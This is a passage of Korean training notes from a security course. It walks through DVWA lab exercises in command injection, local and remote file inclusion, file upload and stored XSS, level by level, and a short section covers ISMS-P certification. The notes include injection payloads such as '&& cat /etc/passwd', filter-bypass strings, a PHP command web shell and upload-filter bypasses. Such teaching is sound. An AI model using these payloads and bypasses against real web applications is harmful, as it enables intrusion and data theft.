여기서 사용자가 127.0.0.1을 입력하면 실제로 이 명령어가 실행되어 그 결과가 출력된다.

#### 1-3. 함수에 의한 명령 인식

입력된 값이 단순 문자열이 아니라 명령으로서 인식되기 위해서는 시스템(system)이라는 함수, 또는 exec, shell_exec와 같은 함수가 사용된다.

코딩하는 사람이 이 함수들과 명령어를 함께 인자값으로 넣어서 웹브라우저에 결과가 나타 나도록 최종적으로 구현해 놓은 것이다.

#### 1-4. 명령어 연결 기호

두 개 이상의 명령어를 연결할 때 사용하는 특수 기호는 다음과 같다.

;  (세미콜론)

&& || |  (파이프라인)

⚠️ 입력하는 곳에 대한 검증 작업이 없게 되면 이러한 기호들을 통해 두 개 이상의 명령어를 추가로 실행시킬 수 있다.

### 2. Low Level

#### 2-1. 소스 분석

Low Level 소스 코드를 보면, 사용자가 입력한 ip 값을 받아서 target이라는 변수에 집어넣 는다. 그 다음 ping에 target 변수를 붙여서 cmd라는 변수에 넣고, 마지막에 echo로 cmd 변수의 값을 모니터에 출력하도록 되어 있다. 검증하는 절차가 하나도 없으며, 단지 받은 값을 명령어로 실행하는 처리만 존재한다.

#### 2-2. 공격 실행

앰퍼샌드(&) 두 개를 이용해서 두 개 이상의 명령어를 연결할 수 있다.

127.0.0.1 && id 127.0.0.1 && cat /etc/passwd 위와 같이 입력하면 ping 명령어 결과 밑에 id 명령어 실행 결과(UID, GID 등)가 함께 출력되는 것을 확인할 수 있다. 이는 이 웹페이지에 사용자가 입력하는 명령어에 대해서 검증하는 작업이 하나도 없다는 것을 의미한다.

### 3. Medium Level

#### 3-1. 보완된 코드

Medium Level 소스를 확인하면 && 와 ; 가 들어오면 공백으로 변환시키도록 되어 있다. 타겟에 들어가 있는 값을 str_replace라는 문자열 대체 함수를 통해 변환하는 방식이다.

#### 3-2. 우회 방법

이 코드의 문제점은 모든 두 개 이상의 명령어를 연결할 수 있는 특수 기호를 다 공백 처리하 지는 못했다는 점이다. 파이프라인( | )을 사용하면 정상적으로 처리가 이루어지는 것을 확인할 수 있다.

127.0.0.1 | id ⚠️ 다른 특수 문자들도 공백 처리가 되지 않았기 때문에 동일한 방식으로 문제가 발생할 수 있다.

### 4. High Level

#### 4-1. 개발자의 실수

High Level 소스를 보면 & , ; , | , || 까지 여러 특수 기호를 공백 처리하고 있는 것을 확인할 수 있다. 하지만 이 중 관리자가 실수한 부분이 있다. 자세히 보면 파이프라인( | ) 기호 뒤에 공백이 하나 있는 형태로 작성되어 있다.

파이프라인 뒤에 공백이 하나 있는 경우에만 공백 처리하도록 되어 있다. 즉, 파이프라인을 넣고 띄어쓰기 없이 바로 명령어를 붙이면 해당 기호는 공백 처리되지 않는다.

#### 4-2. 공략 방법

127.0.0.1 |id 공백을 주지 않고 명령어를 바로 이어 붙이면 뒤에 나오는 명령어가 인식되어 실행되는 취약점을 만날 수 있다.

⚠️ 코딩하다가 하나 띄어서 작성한 실수로, 생각 외로 이러한 부분들이 상당히 많다. 예전에는 개발자와 보안관리자가 완전히 분리되어 있었지만, 요즘은 개발자도 보안에 대한 기 본지식이 있어야 더 좋은 코딩을 할 수 있고, 보안관리자도 기본적인 문법을 보고 확인할 수 있는 역량이 있어야 더 좋다.

### 5. Impossible Level

소스를 보면 다음과 같은 부분들이 추가되어 있다.

토큰(Token) 정보 확인 — 1회성 값 옥텟(Octet) 구분 검사 — IP 주소 형식인지 0번에서 3번까지 점(.)을 기준으로 검사 옥텟을 구분한다는 것은 IP 주소인지 아닌지, 형식에 맞는지 안 맞는지를 점(.)을 기준으로 검사하겠다는 의미이다.

⚠️ 토큰 정보 외에도 실제 IP 주소 형식인지 검사하는 부분들이 추가적으로 들어가 있어 앞서 했던 여러 가지 방식으로 공략하더라도 거의 공략이 이루어지지 않는다. 하지만 추가적인 다른 취약점과 같이 공략하게 되면 파쇄할 수는 있다.

## 139. DVWA 환경 구축

### 1. DVWA 머신 개요

#### 1-1. 배포 파일 형태

실습에 사용하는 파일은 dvwa-1.9.iso이며, 별도의 설치 과정이 필요 없이 부팅하면 바로 사용할 수 있는 형태로 제공된다.

#### 1-2. 운영체제 특징

DVWA 머신은 슬리타즈(Slitaz) 리눅스로 구축되어 있다. 슬리타즈 리눅스는 아주 초경량의 리눅스 버전으로, 네트워크와 시스템적인 부분만 집약해서 경량화시켜 넣어놓은 리눅스이 다.

⚠️ 현재 받은 dvwa-1.9.iso 파일은 최신 버전 대비 몇 가지 메뉴가 빠져 있다. 24버전 (우분투24)에서 DVWA를 설치하면 PHP 버전이 맞지 않기 때문에 파일 인클루전 실습이 이루어지지 않는다. 따라서 먼저 이전 버전으로 실습을 진행하고, 최신 버전은 별도로 우 분투에서 구축한 후 새로 나온 메뉴들을 확인한다.

| 네트워크 | 브릿지 모드(칼리와 통신 가능하도록) |
| USB | 컨트롤러 활성화 체크 해제 |

⚠️ 네트워크는 브릿지로 설정하여 칼리 리눅스와 통신이 가능해야 한다. 칼리는 공격자 (Attacker), DVWA는 희생자 시스템(Victim)이 된다.

설정을 완료한 후 시작하면 별도의 설치 과정 없이 슬리타즈 리눅스가 부팅된다.

### 3. 네트워크(IP) 설정

#### 3-1. IP 미할당 시 확인

브릿지로 설정했다고 하더라도 ifconfig (또는 ifconfig eth0 )으로 확인 시 ETH0에 IP가 올라오지 않는 경우가 발생할 수 있다.

#### 3-2. 네트워크 설정 파일 수정

IP가 올라오지 않을 경우 네트워크 설정 파일을 수동으로 수정한다.

파일 경로: /etc/network.conf 이 파일의 두 번째 라인에는 다음 스크립트를 실행하라는 내용이 적혀 있다.

경로: /etc/init.d/network.sh

#### 3-3. 수동 IP 설정 절차

편집 모드로 들어가서 다음 항목을 수정한다.


| 항목 | 기존값 | 변경값 |
|---|---|---|
| DHCP | yes | no(수동 설정으로 전환) |
| STATIC | (비활성) | yes(수동 설정 활성화) |
| IP | - | 사용하지 않는 IP 주소 지정 |
| SUBNET MASK | - | 환경에 맞게 지정 |
| GATEWAY | - | 환경에 맞게 지정 |
| NAMESERVER | - | 임의값(8.8.8.8 등) 또는 생략<br>가능 |

⚠️ IP 주소는 윈도우에서 ipconfig 로 확인 후, 핑(ping) 테스트로 현재 사용하지 않는 IP를 선택하여 지정한다. 서브넷마스크, 게이트웨이, 네임서버는 ipconfig에서 확인된 값으로 동일하게 입력하면 된다. 네임서버는 입력하지 않아도 동작한다.

#### 3-4. 설정 적용

네트워크 설정 파일을 저장하고 빠져나온 다음, 네트워크 스크립트 파일을 재시작한다.

경로: /etc/init.d/network.sh 명령: restart 해당 슬리타즈 리눅스 머신은 이 스크립트 파일에 의해 네트워크가 제어되는 방식이며, 재부팅이 아니라 스크립트 재시작으로 적용된다. 이후 ifconfig 로 IP가 정상적으로 올라와 있는지 확인한다.

⚠️ 다음 날 머신을 끄고 다시 켜면 수동으로 설정했던 IP는 다시 사라진다. 따라서 매번 부팅 시 동일한 절차(네트워크 설정 파일 확인 및 스크립트 재시작)를 반복해야 한다.

### 4. 칼리 리눅스와의 통신 확인

#### 4-1. 핑 테스트

칼리 리눅스를 부팅하여 로그인한 후 터미널을 열어 DVWA로 핑이 가는지 확인한다. 통신 확인이 완료되면 따로 DVWA 머신을 건드릴 일은 없다.

#### 4-2. 웹 접속 및 로그인

공신 테스트가 완료되면 웹브라우저에서 HTTP로 DVWA의 IP 주소로 접속한다.

접속 형식: http://[DVWA_IP]

접속하면 로그인 화면이 나타나며, 기본 계정 정보는 다음과 같다.

ID: admin Password: password (모두 소문자)

로그인을 완료하면 강의 자료에서 확인했던 메인 화면이 나타난다.

## 140. File Inclusion 취약점

### 1. File Inclusion 개요

#### 1-1. LFI와 RFI의 구분

파일 인클루전 취약점은 기본적으로 파일 실행에 대한 노출이 된다. 파일 실행이 로컬 파일 이냐 원격 파일이냐에 따라 LFI와 RFI로 나누게 된다.


| 구분 | 약어 | 의미 |
|---|---|---|
| LFI | Local File Inclusion | DVWA 안에 있는 파일을 실행할 때의 취약점 |
| RFI | Remote File<br>Inclusion | 외부(칼리)에 있는 파일을 실행할 수 있는 취약점 |

#### 1-2. 페이지 동작 방식 확인

파일 인클루전 취약점을 알아보기 전에 이 웹사이트가 어떻게 동작하는지 먼저 확인해야 한다. file1.php를 클릭하면 "Hello admin"과 현재 접속된 IP 주소가 보여지고, URL에서 page라고 하는 파라미터에 클릭한 값이 들어가는 것을 확인할 수 있다. page 파라미터를 file2.php, file3.php로 변경하면 각각 다른 페이지가 실행된다.

이 사이트는 아파치로 구축이 되어져 있어서, 그 경로를 추정해보면 var 밑에 www 밑에 html 디렉토리 밑의 vulnerabilities 디렉토리 밑에 fi 디렉토리 밑이 된다.

### 2. Low Level — LFI

#### 2-1. 입력값 검증 부재 확인

입력되는 파일에 대한 검증 작업이 없다면, 다른 파일을 입력해서 그 파일이 호출되는지 확인할 수 있다.

?page=/etc/passwd 위와 같이 호출했을 때 LFI가 성립되어 실제 /etc/passwd 파일의 내용이 출력되는 것을 확인할 수 있다.

#### 2-2. 경로 조작을 이용한 우회

?page=../../etc/passwd 점점슬래시( ../ )를 반복하여 상위 디렉토리로 이동한 후 파일을 조회하는 방식도 동일하게 동작한다.

#### 2-3. file 프로토콜을 이용한 호출

프로토콜을 지정하는 방법으로 file 프로토콜을 활용할 수 있다.

?page=file:///etc/passwd 이렇게 해도 동일하게 /etc/passwd 파일의 내용이 출력된다.

⚠️ LFI와 패스 트래버설(Path Traversal, 경로 조작)은 비슷하지만 다르다. LFI는 호출 한 파일 내에 실행할 수 있는 코드값이 있어서 파일 인클루전이 되는 경우이고, 그냥 경로에 있는 내용을 그대로 출력만 하는 경우(코드 실행이 아닌 단순 출력)는 패스 트래버설 (경로 조작)이라고 한다.

#### 2-4. RFI 실습 — 원격 파일 준비

칼리에서 테스트용 파일(test.php)을 작성한다. PHP 코드의 시작과 끝을 나타내는 태그 안에 system 함수를 사용해서 명령어를 실행하도록 한 줄 작성한다. uname -a 는 리눅스의 커널 정보를 보는 명령어이고, 세미콜론으로 연결하여 id 명령어까지 함께 실행하도록 작성한다.

⚠️ PHP 코드 시작 태그는 한 번만 작성해야 하며, system 함수는 안에 있는 문자열을 명령으로 인식해서 처리하는 함수 중 하나이다. shell_exec, exec 함수도 결과는 동일하다.

#### 2-5. 웹 서버로 파일 공개

칼리에서 작성한 파일을 DVWA에서 실행하려면 웹으로 공개해야 한다. 파이썬을 이용해서 웹 서버를 실행하면 현재 디렉토리를 기준으로 웹 서버가 동작하며, 포트를 지정하지 않으면 기본 8000번 포트가 사용된다.

#### 2-6. RFI 호출

page 파라미터에 칼리의 IP와 포트(8000), 그리고 test.php 경로를 넣어서 호출하면 system 함수에 의해 uname -a 와 id  명령어가 실행되어 결과가 웹브라우저 상단에 나타난다. 이는 원격 파일 실행 취약점(RFI)이다.

#### 2-7. Low Level 소스 분석

소스를 확인하면 page 파라미터에 입력된 것을 get 방식으로 가져와서 file이라고 하는 변수에 집어넣는 한 줄짜리 코드밖에 없다. 검증하는 작업이 아무것도 없으므로 어떤 파일이든 지 실행이 가능하다.

### 3. Medium Level

#### 3-1. 보완된 코드

Medium Level에서는 http://, https:// 가 나오면 공백 처리하고, 점점슬래시(../)나 점점역 슬래시도 나오면 공백 처리하도록 str_replace라는 문자열 대체 함수로 처리되어 있다.


| 치환 대상 | 처리 |
|---|---|
| http://, https:// | 공백 처리 |
| ../ 또는 ..\ | 공백 처리 |

#### 3-2. LFI 우회 가능, RFI 차단 확인

점점슬래시를 엮지 않은 단순 LFI는 그대로 잘 동작한다.

?page=/etc/passwd 하지만 RFI 방식은 http:// 가 공백 처리되어 버려서 실제로는 페이지에 192.X와 같은 형태로 잘못 입력되어 경로가 맞지 않으므로 파일이 실행되지 않는다.

#### 3-3. 개발자가 간과한 핵심 부분

http:// 또는 https:// 처리 시, 만약 프로토콜이 HTTP 또는 HTTPS임을 정확하게 검증하지 않으면 다음과 같은 우회가 가능하다.

우회 방법 1: 대소문자 혼용 웹브라우저는 소문자, 대문자, 대소문자 혼용 여부와 관계없이 모두 동일한 프로토콜 (HTTP)로 인식하는 성질이 있다. 따라서 코드에서 대소문자를 구분하지 않고 모두 막도록 작성해야 하는데, 이 부분이 누락되어 있다면 다음과 같이 대문자를 섞어서 우회할 수 있다.

?page=HTtp://[칼리IP]:8000/test.php 우회 방법 2: 공백 처리를 활용한 문자열 재구성 치환 함수가 http:// 를 공백으로 만들어 없애는 점을 역으로 이용하여, 중간에 한 번 더 http:// 를 삽입한다.

htthttp://p://[칼리IP]:8000/test.php 이 문자열에서 가운데에 들어간 http:// 가 공백 처리되어 사라지면, 앞의 'htt'와 뒤의 'p://'가 합쳐져서 다시 'http://'가 되어 정상적으로 경로가 인식된다.

⚠️ 웹브라우저는 앞에 있는 프로토콜에 대해서 대소문자를 가리지 않고 무조건 HTTP 프로토콜로 인식한다. 관리자가 확실하게 막고 싶다면 대소문자를 가리지 않고 HTTP, HTTPS를 모두 막을 수 있도록 코딩해야 한다.

### 4. High Level

#### 4-1. 소스 분석

High Level의 소스 코드를 보면, 파일 이름이 "include.php"가 아니거나 "file"로 시작하는 이름이 아니라면 에러 메시지를 출력하도록 되어 있다.

웹사이트에서 실행되는 파일들이 file1, file2, file3과 같이 "file"이라는 이름으로 시작하므 로, 뒤에는 어떤 문자가 와도 상관없다는 의미이다.

#### 4-2. 공략 방법

"file"로 시작하면 되므로, file 프로토콜을 사용하여 경로를 지정하면 조건을 만족시켜 통과할 수 있다.

?page=file:///etc/passwd 위와 같이 file로 시작하는 형태로 작성하면 코드 검증에서 문제가 없으므로 명령어가 정상적으로 실행되는 것을 확인할 수 있다.

⚠️ 하이레벨에서도 페이지 뒤에 file로 시작하도록 만들면 문제없이 파일 인클루전이 일 어난다.

### 5. Impossible Level

#### 5-1. 화이트리스트 방식 검증

소스를 보면 include.php, file1.php, file2.php, file3.php와 같이 명확하게 파일 이름을 지정해 두고, 이런 이름이 아니면 에러를 출력하도록 되어 있는 것이 가장 확실한 방법이다.

⚠️ 이 외에는 다른 어떤 이름을 넣더라도 파일 실행이 되지 않는다. 다만 단일 취약점으로 는 이 페이지를 공략할 수 없지만, 다른 취약점들이 같이 노출되어 있기 때문에 다른 취약점들과 함께 사용하면 공략을 할 수도 있다. Impossible이 완전히 불가능한 것이 아니라 단일 취약점으로는 불가능하다고 이해하면 된다.

## 141. File Upload 취약점

### 1. 실제 공격자 입장에서의 접근

실제로 공격자 입장에서 DVWA와 같은 시스템을 공략할 때는 실제 코드 내용을 확인하기가 어렵다. 지금은 실습 환경이므로 코드를 직접 볼 수 있지만, 실제로는 코드를 잘 볼 수 없기 때문에 여러 가지 스캐닝이나 정보 수집을 통해 박식하게 정보들을 취합해야 하며, 다양한 방법을 활용하면서 각각의 취약점이나 내용을 확인해가며 진행해야 한다.

### 2. Low Level

#### 2-1. PHP 파일 업로드 테스트

브라우저에서 미리 만들어둔 test.php 파일을 선택하여 업로드를 진행한다. Low Level의 경우 PHP 파일이라 하더라도 그대로 업로드가 이루어지는 것을 확인할 수 있다.

#### 2-2. 업로드 경로 확인

업로드되는 경로는 점점슬래시( ../ ) 밑에 점슬래시 밑에 해커블(hackable)이라고 하는 디렉토리 밑에, 업로드(uploads)라고 하는 디렉토리 밑이 된다. ../ 는 상위 디렉토리를 나타내며, 점점슬래시를 기준으로 한 개, 두 개 상위 디렉토리를 제거하면 실제 경로를 계산할 수 있다.

#### 2-3. cmd.php를 이용한 명령어 실행 파라미터화

업로드된 test.php는 기본적으로 두 개의 명령어( uname -a , id )밖에 실행이 안 되도록 되어 있다. 명령어를 직접 지정해서 실행하고 싶다면 test.php 파일을 cmd.php로 복사한 다음, 안에 있는 명령어 부분만 수정한다. $_GET이라는 변수를 사용해서 cmd라는 문자열을 파라미터로 지정하고, 사용자가 이 cmd 파라미터에 넣은 값이 시스템 함수에 의해 명령어로 처리되도록 코드를 변경한다.

cmd라는 파라미터를 지정하여, 이 파라미터 뒤에 원하는 명령어를 넣을 수 있도록 구성한다.

#### 2-4. cmd.php 업로드 및 실행

업로드된 cmd.php 경로 뒤에, 파라미터의 경계를 나타내는 물음표(?)를 붙이고 cmd라는 파라미터에 실행하고자 하는 명령어를 지정한다. id, uname -a, cat /etc/passwd 처럼 여러 개의 명령어를 세미콜론으로 연결해서 한 번에 실행시켜볼 수 있다. 앞서 테스트했던 test.php보다 훨씬 더 광범위하게 명령어를 입력할 수 있다.

⚠️ 현재 취약점에서 중요한 것은 명령어 실행 자체가 아니라 파일 업로드이다. 업로드하는 파일에 대한 검증 자체가 없으므로 악성 코드나 명령어를 실행할 수 있는 파일들을 업로드할 수 있다는 것이 핵심이다.

#### 2-5. Low Level 소스 분석

업로드되는 대상 경로(해커블 디렉토리의 uploads)가 지정되어 있고, 파일 이름에 대한 검증만 일부 있을 뿐 확장자를 체크하는 부분이 전혀 없다.

⚠️ CTF 실습에서 다루었던 리버스 셸 PHP를 업로드시키고 칼리에서 넷캣(nc)으로 리스닝을 하고 있는 상태에서 해당 파일을 실행하게 되면 칼리에 원격 셀이 들어오게 되는 방식도 동일한 원리로 적용될 수 있다.

### 3. Medium Level

#### 3-1. 업로드 차단 확인

Medium Level에서는 cmd.php 파일을 업로드하면 "이미지가 아니라서 업로드가 안 된다"는 메시지가 표시된다. jpeg 또는 png 이미지만 업로드 가능하다고 안내된다.

#### 3-2. 소스 분석

소스를 확인하면 파일의 사이즈를 지정하고, 파일의 타입이 이미지 슬래시 jpeg인지, 또는 이미지의 png 파일인지를 확인하고, 사이즈가 10만 바이트를 넘지 않으면 업로드가 되고 그렇지 않으면 에러 메시지를 출력하도록 되어 있다. 세 가지 조건(jpeg인지, png인지, 사이즈가 10만 바이트를 넘는지)을 검증하도록 되어 있다.

#### 3-3. MIME 타입의 한계

웹브라우저에서 MIME(Multimedia Internet Mail Extensions)이라는 개념이 있다. 확장 자에 따라 멀티미디어 타입이 지정되는 방식인데, 대부분 확장자만 보고 타입을 판단하기 때문에 실제 내용이 그림인지 아닌지는 잘 검증하지 않는다.

#### 3-4. 확장자 위장을 통한 우회 시도

터미널에서 cmd.php 파일을 cmd.php.jpg 파일로 복사한다. 확장자를 jpg로 바꿔서 그림 파일로 인지되는지 테스트한다. 브라우저에서는 그림 파일 아이콘으로 표시되며, 35바이트 크기로 10만 바이트 조건도 만족하여 정상적으로 업로드된다.

⚠️ 그러나 실행시켜보면 실행이 되지 않고 "연결 에러가 떠서 디스플레이할 수가 없다"는 메시지가 출력된다. 그 이유는 PHP 파일이어야 코드가 실행되는데, 지금은 이미지 파일(.jpg)로 처리되어 있기 때문에 안에 있는 코드가 일반 문자열처럼 인식되어 실행되지 않는다.

#### 3-5. Burp Suite를 이용한 파일명 변조

업로드는 성공시키되 실행은 막힌 상태이므로, 업로드 과정에서 파일 이름을 변조하는 방식으로 우회한다.

### 1. 웹브라우저에서 프락시 설정 후 Burp Suite를 실행한다(ZAP과 동시 사용 시 충돌하므

로 하나만 사용).

### 2. Proxy 탭에서 Intercept를 ON 한다.

### 3. cmd.php.jpg 파일을 선택해서 업로드를 클릭하면 트래픽이 가로채진다.

### 4. 가로챈 요청에서 파일 이름은 cmd.php.jpg, 콘텐츠 타입은 이미지로 확인된다.

### 5. 파일 이름을 cmd.php로 변경한다(.jpg를 제거).

### 6. Forward 하여 서버로 전달한다.

⚠️ 콘텐츠 타입은 이미 이미지(jpeg)로 지정되어 있고, 크기가 10만 바이트보다 작으므 로 조건을 만족시켜 cmd.php 파일명으로 업로드가 성립된다.

#### 3-6. 실행 확인

인터셉트를 OFF로 변경한 후, 업로드된 cmd.php 경로에 원하는 명령어를 넣으면 동일하게 실행할 수 있다.

⚠️ Medium Level의 경우 이미지 타입을 jpg나 png 파일로 검증하도록 했지만, 안에 실제 그림인지 아닌지는 검증하지 않는다는 한계가 있다. 단지 확장자만을 가지고 이미지 인지를 판단하도록 코드화되어 있기 때문에 프락시 툴을 통해 jpg 파일을 올리고 중간에서 가로채서 jpg를 빼버리면 실제 파일이 정상적으로 올라간다.

### 4. High Level

#### 4-1. 차단 확인

하이레벨로 이동하여 동일한 방식(파일명 변조)으로 시도하면 "이미지가 아니어서 업로드가 안 된다"는 메시지가 출력되며 Medium Level과 동일한 방식이 통하지 않는다.

#### 4-2. 소스 분석

High Level 소스에서는 확장자가 jpg 또는 png인지, 사이즈가 10만 바이트 이하인지를 검증하는 것은 Medium Level과 동일하다. 추가로 확인되는 부분은 두 가지이다.

하나는 str2lower라는 함수로, 문자열을 다 소문자로 바꿔주는 함수이다. 대문자를 넣든 소 문자를 넣든 다 소문자로 처리하도록 하여, 확장자뿐만 아니라 사이즈 안에 들어가는 임시 이름들까지 처리한다.

다른 하나는 strrpos라는 함수로, 각각의 이름에 들어가는 부분에 대해서 안에 있는 내용들 이 실제 이미지인지 아닌지를 검증하도록 하는 함수이다.

#### 4-3. GIF89A 매직바이트를 이용한 우회

GIF89a 는 GIF 이미지 파일 포맷의 확장 규격으로, 매직 바이트(Magic Byte)라고 한다. 파일의 시작점에 텍스트로 포함되어 있어 파일 포맷을 인식하는 기준이 된다.

Burp Suite Proxy에서 Intercept를 ON 한 후 cmd.php를 업로드할 때, 컨텐츠의 23번 라인 이후(빈 줄) 24번 라인에 GIF89a라는 문자열을 추가하고 파일 이름에 .jpg를 붙여서 Forward 한다.

웹브라우저는 확장자와 본문 컨텐츠 안에서 GIF89a라는 문자열을 만나면 "안에 그림이 있는 이미지구나"라고 인식하게 된다.

⚠️ 미디엄 레벨에서도 완벽하게 파일 업로드에 대한 취약점을 보완하지 못했다는 것을 확인할 수 있는데, High Level에서는 정상적으로 업로드는 성공하지만 실행을 위해서는 .jpg 확장자에 대한 추가 변경 작업이 필요하다.

### 5. Impossible Level

#### 5-1. 소스 분석

지금까지의 취약점들과 동일하게 토큰 정보(1회성)를 확인하는 부분이 있고, 그 외 추가적으로 경로에 대한 정의, jpg/png 확장자 검증은 동일하다. 추가로 이미지 크리에이트(image create)라는 함수를 통해서, 올라와 있는 업로드하고자 하는 파일이 실제 그림인지 아닌지 를 확인하는 함수가 들어가 있다.

이 함수는 시작점에 GIF89A 문자열을 넣었다고 인식하는 것이 아니라, 실제 콘텐츠가 그림 이어야 통과시킨다.

⚠️ GIF89A 매직바이트 포맷을 지정하더라도 Impossible Level에서는 실제 내부 내용이 이미지가 아니기 때문에 업로드가 제대로 이루어지지 않는다. 다만 이 역시 다른 취약점들과 함께 사용하면 진행할 수 있는 여지가 있다.

### 1. 기업정보보호관리

기업정보보호관리 과목에서는 정보보호인증제도, HTTP 웹해킹 관련 내용, WAF 및 메타스 플로이트를 활용한 모의해킹, 악성코드 분석을 중점적으로 다룬다.

⚠️ 해당 과목은 7월 22일까지 진행되며 수업일수로는 총 20일이 진행된다. 이후 3차 프 로젝트가 진행되고, 8월 6일 기술특강, 8월 7일 취업특강을 끝으로 전체 과정이 완료된다.

### 2. 정보보호인증제도(ISMS-P)

#### 2-1. 인증제도의 필요성과 발급 기관

규모가 있거나 법령에 따라 반드시 인증제도를 통과해야 되는 기업들이 존재한다. 해당 기업에게 주어지는 것이 isms-p.or.kr에서 제공하는 정보보호인증제도이다.

현재 ISMS, PIMS를 각각 별도로 인증받을 수도 있으며, 처음 인증을 받는 기업의 경우 통상적으로 두 개를 함께 인증받는다. 정보보호관리체계에 대한 인증과 개인정보보호에 대한 인증을 합쳐 ISMS-P라고 한다.

웹사이트나 서비스에서 ISMS-P 인증마크를 확인하면, 일반 사용자는 정부에서 보안적으로 인증을 해준 기업이라는 것을 확인할 수 있다.

⚠️ 다만 어떤 솔루션을 적용하거나 어떤 방식으로 관리하더라도 물리적·관리적·기술적 부분이 광범위하게 존재하기 때문에 100% 보안이라는 것은 없다. 따라서 비용 대비 효율 성을 높이기 위한 작업을 하게 된다.

관리체계 수립 및 운영 보호대책 요구사항 개인정보 처리 단계별 요구사항 보호대책에 대한 요구사항 탭에는 2.1에 33개의 요구사항이 있고, 세부적으로 122개의 세부 항목들이 존재한다.

⚠️ 세부 기준은 매년 또는 특정 연도를 기준으로 계속 갱신된다. 이전에는 필요했던 것이 현재는 필요 없을 수도 있고, 새롭게 나온 서비스나 시스템이 있어서 그 부분에 관련된 내용을 점검해야 될 필요성도 있기 때문이다.

#### 3-2. 관련 추가 인증제도

ISMS-P 외에도 정보보호 등급제, 클라우드 보안 인증제와 같은 제도가 추가적으로 존재한다.

## 143. XSS Stored

### 1. XSS Stored 개요

스토어드(저장형)는 스크립트 실행이라는 점에서 Reflected와 동일하지만, 그 스크립트가 저장이 되느냐 안 되느냐의 차이점만 있다. 기본적으로 동일한 원리라고 생각하면 된다.

### 2. Low Level

#### 2-1. 게시판(게스트북) 형식 확인

DVWA Security에서 Low Level로 변경한 후 XSS Stored 메뉴에 들어가면, 게스트북(방 명록) 형태의 게시판이 나타난다. 이름과 메시지를 입력하고 등록하면 게시판에 글이 순서대로 들어간다.

#### 2-2. 저장 여부 확인

글을 작성한 후 파일 업로드 등 다른 메뉴에 들어갔다가 다시 XSS Stored로 돌아오면, 작성 했던 내용이 그대로 남아있는 것을 확인할 수 있다. 이는 DB에 저장된다는 것을 의미한다.

#### 2-3. 메시지 필드에 스크립트 삽입

메시지 입력란에 alert를 사용해서 'hack'이라는 문자열을 넣고 스크립트 태그를 닫은 뒤 "Sign Guestbook"을 클릭하면 스크립트가 실행되는 것을 확인할 수 있다. 이름(Name) 필드는 일반 텍스트로 출력되고, 메시지(Message) 필드는 스크립트가 실행되어 일반 문자열로 인식되지 않는 것을 확인할 수 있다.

#### 2-4. Name 필드에서의 길이 제한 우회

Name 필드에도 스크립트 태그를 넣으려고 하면 입력 길이 제한 때문에 더 이상 입력이 되지 않는 경우가 있다. 개발자 도구(F12)를 통해 이를 변경할 수 있다.

### 1. F12를 눌러 개발자 도구를 연다.

### 2. 좌측 상단의 선택 도구(요소 검사기)를 클릭한다.

### 3. Name 입력란을 클릭하면 해당 HTML 태그가 표시된다.

### 4. max length 속성이 10글자로 제한되어 있는 것을 확인한다.

더블클릭해서 max length 값을 100과 같이 임시로 늘려준다. 이후 스크립트를 입력하면 정상적으로 들어가는 것을 확인할 수 있다. Name 필드에 스크립트가 실행된다면 Name 필드 에도 XSS 취약점이 존재한다는 것이 된다.

⚠️ Name 필드와 Message 필드에 스크립트 태그를 모두 넣어도 실행이 된다는 것을 의미한다.

#### 2-5. Low Level 소스 분석

소스를 확인하면 message가 들어오는 부분 외에 별다른 검증 작업은 없다. 따로 검증하는 작업이 없다는 것을 확인할 수 있다.

### 3. Medium Level

#### 3-1. 저장된 스크립트의 재실행 확인

시큐리티 레벨을 Medium으로 변경한 후, 다른 곳에 갔다가 다시 XSS Stored로 들어오면 이전에 Low Level에서 저장했던 스크립트가 먼저 실행되는 것을 확인할 수 있다. 이것이 저장형(Stored)의 특징이다.

#### 3-2. 새 스크립트 삽입 테스트

Medium Level에서 동일한 스크립트( <script>alert('hack')</script> )를 다시 넣어 실행해 보면, 미디엄 레벨에서도 동일하게 동작한다. 다만 이는 이전 단계(Low Level)에서 저장된 스크립트가 실행된 것이며, 새롭게 입력한 스크립트 태그 자체는 사라지고 일반 문자열로 들 어온다.

#### 3-3. 소스 분석

소스를 확인하면 Reflected와 비슷하게 strip tags, mysql real escape string, htmlspecialchars 함수들이 사용되고 있다. <script>  태그가 공백으로 치환되어 출력되는 것을 확인할 수 있다.

#### 3-4. 대소문자 우회

Medium Level에서는 스크립트 태그에 대해서 소문자만 공백 처리하도록 되어 있다면, Reflected와 동일하게 대소문자를 섞는 방식으로 우회할 수 있다.

⚠️ 다만 동호(부등호)와 같은 특수문자들이 모두 엔티티(Entity) 값으로 변환이 이루어지는 부분도 함께 적용되어 있다면, 대소문자를 바꾸더라도 제대로 태그가 실행되지 않을 수 있다. 미디엄 레벨에서도 다른 우회 기법(이미지 태그 등)을 함께 검토할 필요가 있다.

⚠️ 미디엄 레벨에서 어렵게 느껴질 수 있으나, 무엇이든 우회할 수 있는 방법이 존재한다. 현재 Low Level에 있는 스크립트 태그 우회뿐만 아니라 다른 이미지(img) 태그나 body 태그 같은 추가적인 태그들을 사용하면 <script>  또는 </script>  태그를 우회할 수 있는 부분들이 존재한다.

### 4. High Level

#### 4-1. 저장된 스크립트 재실행

하이레벨에서도 이전 레벨에서 저장되었던 스크립트들이 실행되며(저장형의 특징), 두 개의 기존 스크립트가 모두 실행된다.

#### 4-2. 추가된 보안 처리

High Level에서는 다음과 같은 추가 작업이 들어가 있다.

대소문자를 가리지 않고 스크립트 태그를 공백 처리 특수문자를 엔티티(Entity)로 변환하는 처리도 동시 적용 이미지(img) src 태그와 같은 우회 태그조차 입력할 수 없도록 하는 추가 작업 ⚠️ 기존의 스크립트 태그만으로는 저장형의 경우 Low Level을 제외하고는 공략하기가 쉽지 않다는 것을 확인할 수 있는데, 그 이유는 HTML 스페셜 캐릭터스라고 하는 함수 때문이다. Medium Level부터 스크립트 실행을 통해 파쇄를 하기 위해서는 해당 취약점뿐 만 아니라 다른 취약점들과 병행해서 진행해야 한다.

#### 4-3. 입력 길이 제한 우회(참고)

문자를 많이 입력하면 일정 길이 이후로 더 이상 입력이 되지 않도록 되어 있는 경우, 개발자 도구에서 동일한 방식으로 max length 속성을 찾아 값을 늘릴 수 있다. max length가 50으로 되어 있다면 500과 같이 임시로 늘려서 더 긴 태그를 입력할 수 있다.

### 5. Reflected와 Stored의 핵심 차이 정리


| 구분 | 특징 |
|---|---|
| Reflected(반사형) | 1회성. 다시 페이지를 방문해도 스크립트가 재실행되지 않음 |
| Stored(저장형) | 페이지를 다시 방문할 때마다 저장된 스크립트가 자동으로 다시 실행됨 |

크로스 사이트 스크립팅(XSS)이라고 하는 취약점 자체는 동일하며, 반사형과 저장형은 저장 여부와 재실행 시점에서만 차이가 있다.
